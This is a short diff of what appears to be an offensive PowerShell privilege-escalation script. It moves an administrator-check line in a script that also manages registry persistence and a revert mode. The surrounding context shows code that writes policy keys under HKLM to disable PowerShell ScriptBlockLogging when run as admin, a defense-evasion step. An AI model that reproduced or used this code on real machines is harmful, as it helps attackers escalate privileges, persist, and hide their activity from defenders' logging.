@@ -106,6 +106,7 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
    ## Delete 'persistence' '$Command' left behind by: '$MakeItPersistence' function.
    # This function 'reverts' all regedit hacks to the previous state before the EOP.
+   $CheckAmsiLogging = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match"S-1-5-32-544")
    If($param1 -eq "deleteEOP"){
       Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 400
       ## Make sure the vulnerable registry key exists
@@ -151,7 +152,6 @@ If($CheckVuln -eq $True -or $param2 -ieq "-Force"){
 
    ## Add Entrys to Regedit { using powershell }
    # disable AMSI ScriptBlockLogging (IF admin shell)
-   $CheckAmsiLogging = [bool](([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match"S-1-5-32-544")
    If($CheckAmsiLogging -eq $True){
       Write-Host "[ ] Admin     => Disable AMSI ScriptBlockLogging." -ForeGroundColor Green;Start-Sleep -Milliseconds 400
       New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force -EA SilentlyContinue|Out-Null
